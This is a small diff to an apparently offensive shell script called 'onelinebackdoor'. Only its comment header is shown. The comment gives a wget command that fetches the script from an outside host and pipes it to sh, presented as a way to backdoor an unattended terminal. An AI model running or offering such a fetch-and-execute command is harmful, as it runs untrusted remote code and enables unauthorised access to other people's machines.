@@ -1,3 +1,4 @@
+#!/bin/sh
 ## You see, a dodgy hacker could just exec this script by typing:
 ##   wget -nv -O - http://hwi.ath.cx/jshtools/onelinebackdoor | sh
 ## So don't leave your terminals unattended!
